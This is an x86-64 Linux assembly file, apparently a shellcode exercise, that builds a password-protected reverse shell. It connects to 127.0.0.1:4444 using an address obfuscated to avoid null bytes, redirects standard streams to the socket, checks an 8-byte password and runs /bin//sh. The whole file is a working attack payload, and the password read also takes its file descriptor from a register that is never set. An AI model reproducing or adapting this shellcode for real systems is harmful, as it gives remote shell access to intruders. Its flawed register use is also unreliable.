global _start


_start:

	; sock = socket(AF_INET, SOCK_STREAM, 0)
	; AF_INET = 2
	; SOCK_STREAM = 1
	; syscall number 41 


	xor rax, rax
	xor rdi, rdi
	xor rsi, rsi
	xor rdx, rdx
	mov al, 41
	mov dil, 2
	mov sil, 1
	;mov dl, 0
	xor rdx, rdx
	syscall

	; copy socket descriptor to rdi for future use 

	mov rdi, rax


	; server.sin_family = AF_INET 
	; server.sin_port = htons(PORT)
	; server.sin_addr.s_addr = inet_addr("127.0.0.1")
	; bzero(&server.sin_zero, 8)

	xor rax, rax 

	push rax
	
	;mov dword [rsp-4], 0x0100007f
	xor r13, r13
	mov r13d, 0x2111190
	sub r13d, 0x1111111

	mov dword [rsp-4], r13d
	mov word [rsp-6], 0x5c11

	;mov word [rsp-8], 0x2
	xor r13, r13
	mov r13b, 0x2
	mov word [rsp-8], r13w

	sub rsp, 8


	; connect(sock, (struct sockaddr *)&server, sockaddr_len)
	
	xor rax, rax
	mov al, 42
	mov rsi, rsp
	xor rdx, rdx
	mov dl, 16
	syscall


        ; duplicate sockets

        ; dup2 (new, old)
        
	xor rax, rax
	mov al, 33
        ;mov rsi, 0
	xor rsi, rsi
        syscall

        xor rax, rax
	mov al, 33
	xor rsi, rsi
        mov sil, 1
        syscall

        xor rax, rax
	mov al, 33
        xor rsi, rsi
	mov sil, 2
        syscall

	;password read and compare section, exit if not same
	;password is "AAAAAAAA"
	mov rbx, 0x4141414141414141

	;read syscall and check for password
        ;ssize_t read(int fd, void *buf, size_t count);
        ;fd = r9 in rdi
        mov rdi, r9

	;buf = password in rsi
        sub rsp,8       ;location for password read
        mov rsi,rsp

	;sycallnumber 0 in rax
        xor rax,rax

	;count = count of chars in password in rdx
        xor rdx,rdx
        add rdx,8

        syscall

	;compare result, if not same exit gracefully
        cmp rbx, [rsi]   ; if same then ZF tripped
        jnz exit    ;if not the same do exit module, otherwise continue

        ; execve

        ; First NULL push

        xor rax, rax
        push rax

        ; push /bin//sh in reverse

        mov rbx, 0x68732f2f6e69622f
        push rbx

        ; store /bin//sh address in RDI

        mov rdi, rsp

        ; Second NULL push
        push rax

        ; set RDX
        mov rdx, rsp


        ; Push address of /bin//sh
        push rdi

        ; set RSI

        mov rsi, rsp

        ; Call the Execve syscall
        xor rax, rax
	add rax, 59
        syscall

exit:
	xor rax, rax
	xor rdi, rdi
	mov al, 60
	mov dil, 11
	syscall
 
